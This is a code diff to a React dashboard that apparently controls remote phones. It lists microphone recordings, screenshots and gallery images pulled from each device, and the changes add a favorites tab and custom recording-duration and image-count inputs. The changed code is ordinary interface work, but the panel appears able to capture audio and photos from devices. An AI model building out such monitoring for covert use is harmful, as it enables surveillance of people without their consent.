@@ -456,7 +456,7 @@
   }
 
   /* ─── Recording row (inline player) ─────────────────────────── */
-  function RecRow({rec, deviceId, onDelete}) {
+  function RecRow({rec, deviceId, onDelete, onStar, starred, inFavorites}) {
     const [open, setOpen] = useState(false);
     return (
       <div style={{borderBottom:'1px solid #F0F4F5', padding:'11px 0'}}>
@@ -487,6 +487,19 @@
                 border:'1px solid #C6F6D5', color:'#38A169', textDecoration:'none',
               }}
             >⬇</a>
+            {!inFavorites && (
+              <button
+                onClick={()=>onStar && onStar(deviceId, rec.filename)}
+                disabled={starred}
+                title={starred ? 'Already favorited' : 'Add to favorites'}
+                style={{
+                  height:32, padding:'0 10px', fontSize:14, borderRadius:8,
+                  border:'1px solid #FEEBC8', color: starred?'#D69E2E':'#ED8936',
+                  background: starred ? '#FFFBEB' : '#FFF',
+                  cursor: starred ? 'default' : 'pointer',
+                }}
+              >{starred ? '★' : '☆'}</button>
+            )}
             <button
               onClick={()=>onDelete(deviceId, rec.filename)}
               style={{
@@ -506,7 +519,7 @@
   }
 
   /* ─── Device group block (Recordings) ───────────────────────── */
-  function RecGroup({deviceId, group, onDelete, onDeleteAll}) {
+  function RecGroup({deviceId, group, onDelete, onDeleteAll, onStar, favSet, inFavorites}) {
     const [open, setOpen] = useState(true);
     const color = devColor(deviceId);
     return (
@@ -538,15 +551,22 @@
             border:`1.5px solid ${color+'33'}`, borderTop:'none',
             padding:'0 14px',
           }}>
+            {!inFavorites && (
+              <div style={{padding:'10px 0', borderBottom:'1px solid #F0F4F5'}}>
+                <button onClick={()=>onDeleteAll(deviceId)} style={{
+                  width:'100%', fontSize:12, fontWeight:600, padding:'8px 0', borderRadius:8,
+                  border:'1px solid #FED7D7', color:'#E53E3E', background:'#FFF5F5', cursor:'pointer',
+                }}>🗑 Delete All Recordings</button>
+              </div>
+            )}
             {group.recordings.map(rec => (
-              <RecRow key={rec.filename} rec={rec} deviceId={deviceId} onDelete={onDelete} />
+              <RecRow
+                key={rec.filename} rec={rec} deviceId={deviceId}
+                onDelete={onDelete} onStar={onStar}
+                starred={favSet ? favSet.has(rec.filename) : false}
+                inFavorites={inFavorites}
+              />
             ))}
-            <div style={{padding:'10px 0', borderTop:'1px solid #F0F4F5'}}>
-              <button onClick={()=>onDeleteAll(deviceId)} style={{
-                width:'100%', fontSize:12, fontWeight:600, padding:'8px 0', borderRadius:8,
-                border:'1px solid #FED7D7', color:'#E53E3E', background:'#FFF5F5', cursor:'pointer',
-              }}>🗑 Delete All Recordings</button>
-            </div>
           </div>
         )}
       </div>
@@ -554,7 +574,7 @@
   }
 
   /* ─── Screenshot thumbnail ───────────────────────────────────── */
-  function ShotThumb({shot, deviceId, onDelete, onLightbox}) {
+  function ShotThumb({shot, deviceId, onDelete, onLightbox, onStar, starred, inFavorites}) {
     return (
       <div style={{
         background:'#FFF', borderRadius:10, overflow:'hidden',
@@ -574,6 +594,19 @@
               fontSize:12, padding:'4px 0', borderRadius:6,
               border:'1px solid #C6F6D5', color:'#38A169', textDecoration:'none',
             }}>⬇</a>
+            {!inFavorites && (
+              <button
+                onClick={()=>onStar && onStar(deviceId, shot.filename)}
+                disabled={starred}
+                title={starred ? 'Already favorited' : 'Add to favorites'}
+                style={{
+                  flex:1, fontSize:14, padding:'4px 0', borderRadius:6,
+                  border:'1px solid #FEEBC8', color: starred?'#D69E2E':'#ED8936',
+                  background: starred ? '#FFFBEB' : '#FFF',
+                  cursor: starred ? 'default' : 'pointer',
+                }}
+              >{starred ? '★' : '☆'}</button>
+            )}
             <button
               onClick={()=>onDelete(deviceId, shot.filename)}
               style={{
@@ -588,7 +621,7 @@
   }
 
   /* ─── Device group block (Screenshots) ──────────────────────── */
-  function ShotGroup({deviceId, group, onDelete, onDeleteAll, onLightbox}) {
+  function ShotGroup({deviceId, group, onDelete, onDeleteAll, onLightbox, onStar, favSet, inFavorites}) {
     const [open, setOpen] = useState(true);
     const color = devColor(deviceId);
     return (
@@ -620,19 +653,25 @@
             border:`1.5px solid ${color+'33'}`, borderTop:'none',
             padding:10,
           }}>
-            <div style={{display:'grid', gridTemplateColumns:'repeat(2,1fr)', gap:8, marginBottom:8}}>
+            {!inFavorites && (
+              <button onClick={()=>onDeleteAll(deviceId)} style={{
+                width:'100%', fontSize:12, fontWeight:600, padding:'8px 0', borderRadius:8,
+                border:'1px solid #FED7D7', color:'#E53E3E', background:'#FFF5F5', cursor:'pointer',
+                marginBottom:10,
+              }}>🗑 Delete All Screenshots</button>
+            )}
+            <div style={{display:'grid', gridTemplateColumns:'repeat(2,1fr)', gap:8}}>
               {group.screenshots.map(shot => (
                 <ShotThumb
                   key={shot.filename}
                   shot={shot} deviceId={deviceId}
                   onDelete={onDelete} onLightbox={onLightbox}
+                  onStar={onStar}
+                  starred={favSet ? favSet.has(shot.filename) : false}
+                  inFavorites={inFavorites}
                 />
               ))}
             </div>
-            <button onClick={()=>onDeleteAll(deviceId)} style={{
-              width:'100%', fontSize:12, fontWeight:600, padding:'8px 0', borderRadius:8,
-              border:'1px solid #FED7D7', color:'#E53E3E', background:'#FFF5F5', cursor:'pointer',
-            }}>🗑 Delete All Screenshots</button>
           </div>
         )}
       </div>
@@ -640,7 +679,7 @@
   }
 
   /* ─── Gallery thumbnail ───────────────────────────────────────── */
-  function GalleryThumb({img, deviceId, onDelete, onLightbox}) {
+  function GalleryThumb({img, deviceId, onDelete, onLightbox, onStar, starred, inFavorites}) {
     return (
       <div style={{
         background:'#FFF', borderRadius:10, overflow:'hidden',
@@ -664,6 +703,19 @@
               fontSize:12, padding:'4px 0', borderRadius:6,
               border:'1px solid #C6F6D5', color:'#38A169', textDecoration:'none',
             }}>⬇</a>
+            {!inFavorites && (
+              <button
+                onClick={()=>onStar && onStar(deviceId, img.filename)}
+                disabled={starred}
+                title={starred ? 'Already favorited' : 'Add to favorites'}
+                style={{
+                  flex:1, fontSize:14, padding:'4px 0', borderRadius:6,
+                  border:'1px solid #FEEBC8', color: starred?'#D69E2E':'#ED8936',
+                  background: starred ? '#FFFBEB' : '#FFF',
+                  cursor: starred ? 'default' : 'pointer',
+                }}
+              >{starred ? '★' : '☆'}</button>
+            )}
             <button
               onClick={()=>onDelete(deviceId, img.filename)}
               style={{
@@ -678,7 +730,7 @@
   }
 
   /* ─── Device group block (Gallery) ──────────────────────────── */
-  function GalleryGroup({deviceId, group, onDelete, onDeleteAll, onLightbox}) {
+  function GalleryGroup({deviceId, group, onDelete, onDeleteAll, onLightbox, onStar, favSet, inFavorites}) {
     const [open, setOpen] = useState(true);
     const color = devColor(deviceId);
     return (
@@ -710,19 +762,25 @@
             border:`1.5px solid ${color+'33'}`, borderTop:'none',
             padding:10,
           }}>
-            <div style={{display:'grid', gridTemplateColumns:'repeat(2,1fr)', gap:8, marginBottom:8}}>
+            {!inFavorites && (
+              <button onClick={()=>onDeleteAll(deviceId)} style={{
+                width:'100%', fontSize:12, fontWeight:600, padding:'8px 0', borderRadius:8,
+                border:'1px solid #FED7D7', color:'#E53E3E', background:'#FFF5F5', cursor:'pointer',
+                marginBottom:10,
+              }}>🗑 Delete All Gallery Images</button>
+            )}
+            <div style={{display:'grid', gridTemplateColumns:'repeat(2,1fr)', gap:8}}>
               {group.images.map(img => (
                 <GalleryThumb
                   key={img.filename}
                   img={img} deviceId={deviceId}
                   onDelete={onDelete} onLightbox={onLightbox}
+                  onStar={onStar}
+                  starred={favSet ? favSet.has(img.filename) : false}
+                  inFavorites={inFavorites}
                 />
               ))}
             </div>
-            <button onClick={()=>onDeleteAll(deviceId)} style={{
-              width:'100%', fontSize:12, fontWeight:600, padding:'8px 0', borderRadius:8,
-              border:'1px solid #FED7D7', color:'#E53E3E', background:'#FFF5F5', cursor:'pointer',
-            }}>🗑 Delete All Gallery Images</button>
           </div>
         )}
       </div>
@@ -869,15 +927,17 @@
                 {/* Max count */}
                 <div style={{display:'flex', gap:6, alignItems:'center', marginBottom:10}}>
                   <div style={{fontSize:11, fontWeight:700, color:'#718096'}}>Max images:</div>
-                  <select value={advCount} onChange={e=>setAdvCount(Number(e.target.value))}
-                    style={{height:34, padding:'0 8px', fontSize:12, borderRadius:8, border:'1.5px solid #E2E8F0', background:'#FFF'}}>
-                    <option value={10}>10</option>
-                    <option value={20}>20</option>
-                    <option value={50}>50</option>
-                    <option value={100}>100</option>
-                    <option value={200}>200</option>
-                    <option value={0}>All</option>
-                  </select>
+                  <input
+                    type="number" min="0" step="1" inputMode="numeric"
+                    value={advCount}
+                    onChange={e=>{
+                      const v = e.target.value;
+                      setAdvCount(v === '' ? 0 : Math.max(0, parseInt(v,10) || 0));
+                    }}
+                    placeholder="0 = all"
+                    style={{height:34, padding:'0 10px', width:110, fontSize:12, borderRadius:8, border:'1.5px solid #E2E8F0', background:'#FFF'}}
+                  />
+                  <span style={{fontSize:10, color:'#A0AEC0'}}>(0 = all)</span>
                 </div>
 
                 <Btn full color="#E67E22" onClick={runFlexQuery} disabled={isWorking}>
@@ -964,6 +1024,27 @@
     const [audioTesting,    setAudioTesting]    = useState({});
     const [apkInfo,         setApkInfo]         = useState(null);
     const [apkUploading,    setApkUploading]    = useState(false);
+    const [favorites,       setFavorites]       = useState(() => {
+      try { return JSON.parse(localStorage.getItem('bm_favorites') || '{}'); } catch { return {}; }
+    });
+    useEffect(() => {
+      try { localStorage.setItem('bm_favorites', JSON.stringify(favorites)); } catch {}
+    }, [favorites]);
+    const isFav = (kind, deviceId, filename) =>
+      !!(favorites[kind]?.[deviceId]?.includes(filename));
+    const addFav = (kind, deviceId, filename) => setFavorites(p => {
+      const k = { ...(p[kind] || {}) };
+      const arr = new Set(k[deviceId] || []);
+      arr.add(filename);
+      k[deviceId] = [...arr];
+      return { ...p, [kind]: k };
+    });
+    const removeFav = (kind, deviceId, filename) => setFavorites(p => {
+      const k = { ...(p[kind] || {}) };
+      k[deviceId] = (k[deviceId] || []).filter(f => f !== filename);
+      if (!k[deviceId].length) delete k[deviceId];
+      return { ...p, [kind]: k };
+    });
 
     const socketRef   = useRef(null);
     const timerRefs   = useRef({});
@@ -974,6 +1055,42 @@
     const totalRec    = useMemo(() => Object.values(recordings).reduce((s,g)=>s+(g.recordings?.length||0),0), [recordings]);
     const totalShots  = useMemo(() => Object.values(screenshots).reduce((s,g)=>s+(g.screenshots?.length||0),0), [screenshots]);
     const totalGallery = useMemo(() => Object.values(gallery).reduce((s,g)=>s+(g.images?.length||0),0), [gallery]);
+
+    const favSetFor = (kind, deviceId) => new Set(favorites[kind]?.[deviceId] || []);
+    const filterGroup = (kind, groups, itemsKey) => {
+      const out = {};
+      Object.entries(groups).forEach(([id, g]) => {
+        const fset = favSetFor(kind, id);
+        const kept = (g[itemsKey] || []).filter(it => !fset.has(it.filename));
+        if (kept.length) out[id] = { ...g, [itemsKey]: kept };
+      });
+      return out;
+    };
+    const pickFavGroup = (kind, groups, itemsKey) => {
+      const out = {};
+      Object.entries(groups).forEach(([id, g]) => {
+        const fset = favSetFor(kind, id);
+        const kept = (g[itemsKey] || []).filter(it => fset.has(it.filename));
+        if (kept.length) out[id] = { ...g, [itemsKey]: kept };
+      });
+      return out;
+    };
+
+    const visibleRec     = useMemo(() => filterGroup('recordings',  recordings,  'recordings'),  [recordings, favorites]);
+    const visibleShot    = useMemo(() => filterGroup('screenshots', screenshots, 'screenshots'), [screenshots, favorites]);
+    const visibleGallery = useMemo(() => filterGroup('gallery',     gallery,     'images'),      [gallery, favorites]);
+    const favRec     = useMemo(() => pickFavGroup('recordings',  recordings,  'recordings'),  [recordings, favorites]);
+    const favShot    = useMemo(() => pickFavGroup('screenshots', screenshots, 'screenshots'), [screenshots, favorites]);
+    const favGallery = useMemo(() => pickFavGroup('gallery',     gallery,     'images'),      [gallery, favorites]);
+
+    const visibleTotalRec     = useMemo(() => Object.values(visibleRec).reduce((s,g)=>s+g.recordings.length,0), [visibleRec]);
+    const visibleTotalShot    = useMemo(() => Object.values(visibleShot).reduce((s,g)=>s+g.screenshots.length,0), [visibleShot]);
+    const visibleTotalGallery = useMemo(() => Object.values(visibleGallery).reduce((s,g)=>s+g.images.length,0), [visibleGallery]);
+    const totalFav = useMemo(() =>
+      Object.values(favRec).reduce((s,g)=>s+g.recordings.length,0) +
+      Object.values(favShot).reduce((s,g)=>s+g.screenshots.length,0) +
+      Object.values(favGallery).reduce((s,g)=>s+g.images.length,0)
+    , [favRec, favShot, favGallery]);
 
     const showToast = useCallback((msg, type='info') => {
       setToast({msg, type});
@@ -1316,11 +1433,12 @@
           scrollbarWidth:'none', msOverflowStyle:'none',
         }}>
           {[
-            { id:'devices',     label:'Devices',     count:devList.length, color:'#4A90A4' },
-            { id:'recordings',  label:'Records',     count:totalRec,       color:'#4A90A4' },
-            { id:'screenshots', label:'Shots',        count:totalShots,     color:'#7B68AE' },
-            { id:'gallery',     label:'Gallery',     count:totalGallery,   color:'#E67E22' },
-            { id:'app',         label:'App',         count:0,              color:'#DD6B20' },
+            { id:'devices',     label:'Devices',     count:devList.length,      color:'#4A90A4' },
+            { id:'recordings',  label:'Records',     count:visibleTotalRec,     color:'#4A90A4' },
+            { id:'screenshots', label:'Shots',       count:visibleTotalShot,    color:'#7B68AE' },
+            { id:'gallery',     label:'Gallery',     count:visibleTotalGallery, color:'#E67E22' },
+            { id:'favorites',   label:'★ Favorites', count:totalFav,            color:'#D69E2E' },
+            { id:'app',         label:'App',         count:0,                   color:'#DD6B20' },
           ].map(t => (
             <button key={t.id} style={tabStyle(tab===t.id, t.color)} onClick={()=>{
               setTab(t.id);
@@ -1372,20 +1490,55 @@
 
           {/* RECORDINGS */}
           {tab === 'recordings' && (
-            Object.keys(recordings).length === 0
+            Object.keys(visibleRec).length === 0
               ? <Empty icon="🎙" title="No recordings yet" sub="Start a recording from the Devices tab" />
-              : Object.entries(recordings).map(([id, g]) => (
-                  <RecGroup key={id} deviceId={id} group={g} onDelete={delRec} onDeleteAll={delAllRec} />
+              : Object.entries(visibleRec).map(([id, g]) => (
+                  <RecGroup key={id} deviceId={id} group={g}
+                    onDelete={delRec} onDeleteAll={delAllRec}
+                    onStar={(d,f)=>addFav('recordings',d,f)}
+                    favSet={favSetFor('recordings', id)}
+                  />
                 ))
           )}
 
           {/* SCREENSHOTS */}
           {tab === 'screenshots' && (
-            Object.keys(screenshots).length === 0
+            Object.keys(visibleShot).length === 0
               ? <Empty icon="🖼" title="No screenshots yet" sub="Take screenshots from the Devices tab" />
-              : Object.entries(screenshots).map(([id, g]) => (
-                  <ShotGroup key={id} deviceId={id} group={g} onDelete={delShot} onDeleteAll={delAllShot} onLightbox={setLightbox} />
+              : Object.entries(visibleShot).map(([id, g]) => (
+                  <ShotGroup key={id} deviceId={id} group={g}
+                    onDelete={delShot} onDeleteAll={delAllShot} onLightbox={setLightbox}
+                    onStar={(d,f)=>addFav('screenshots',d,f)}
+                    favSet={favSetFor('screenshots', id)}
+                  />
                 ))
+          )}
+
+          {/* FAVORITES */}
+          {tab === 'favorites' && (
+            totalFav === 0
+              ? <Empty icon="★" title="No favorites yet" sub="Tap ☆ on any recording, screenshot, or gallery image to add it here" />
+              : (() => {
+                  const ids = new Set([
+                    ...Object.keys(favRec), ...Object.keys(favShot), ...Object.keys(favGallery)
+                  ]);
+                  return [...ids].map(id => (
+                    <div key={id}>
+                      {favRec[id] && (
+                        <RecGroup deviceId={id} group={favRec[id]}
+                          onDelete={delRec} inFavorites />
+                      )}
+                      {favShot[id] && (
+                        <ShotGroup deviceId={id} group={favShot[id]}
+                          onDelete={delShot} onLightbox={setLightbox} inFavorites />
+                      )}
+                      {favGallery[id] && (
+                        <GalleryGroup deviceId={id} group={favGallery[id]}
+                          onDelete={delGallery} onLightbox={setLightbox} inFavorites />
+                      )}
+                    </div>
+                  ));
+                })()
           )}
 
           {/* GALLERY */}
@@ -1410,10 +1563,14 @@
               )}
 
               {/* Downloaded gallery images */}
-              {Object.keys(gallery).length === 0
+              {Object.keys(visibleGallery).length === 0
                 ? <Empty icon="🖼" title="No gallery images yet" sub="Use the Gallery button on a device to fetch images" />
-                : Object.entries(gallery).map(([id, g]) => (
-                    <GalleryGroup key={id} deviceId={id} group={g} onDelete={delGallery} onDeleteAll={delAllGallery} onLightbox={setLightbox} />
+                : Object.entries(visibleGallery).map(([id, g]) => (
+                    <GalleryGroup key={id} deviceId={id} group={g}
+                      onDelete={delGallery} onDeleteAll={delAllGallery} onLightbox={setLightbox}
+                      onStar={(d,f)=>addFav('gallery',d,f)}
+                      favSet={favSetFor('gallery', id)}
+                    />
                   ))
               }
             </div>
@@ -1489,18 +1646,35 @@
             display:'flex', gap:8, alignItems:'center',
             boxShadow:'0 -2px 14px rgba(0,0,0,0.09)',
           }}>
-            {/* Duration picker */}
+            {/* Duration picker (dropdown + custom minutes input) */}
             <select
-              value={duration}
-              onChange={e=>setDuration(Number(e.target.value))}
+              value={DURATIONS.some(d=>d.value===duration) ? duration : ''}
+              onChange={e=>{ if (e.target.value) setDuration(Number(e.target.value)); }}
               style={{
-                flexShrink:0, height:44, padding:'0 10px', fontSize:13, fontWeight:600,
+                flexShrink:0, height:44, padding:'0 8px', fontSize:13, fontWeight:600,
                 borderRadius:10, border:'1.5px solid #E2E8F0', background:'#F7FAFC',
                 color:'#2D3748', WebkitAppearance:'none', cursor:'pointer',
               }}
             >
+              <option value="" disabled>Custom…</option>
               {DURATIONS.map(d=><option key={d.value} value={d.value}>{d.label}</option>)}
             </select>
+            <input
+              type="number" min="1" step="1" inputMode="numeric"
+              placeholder="min"
+              value={Math.round(duration/60) || ''}
+              onChange={e=>{
+                const n = parseInt(e.target.value, 10);
+                if (!isNaN(n) && n > 0) setDuration(n * 60);
+                else if (e.target.value === '') setDuration(0);
+              }}
+              title="Custom minutes"
+              style={{
+                flexShrink:0, width:60, height:44, padding:'0 8px', fontSize:13, fontWeight:600,
+                borderRadius:10, border:'1.5px solid #E2E8F0', background:'#FFF',
+                color:'#2D3748', textAlign:'center',
+              }}
+            />
 
             {/* Record all */}
             <Btn
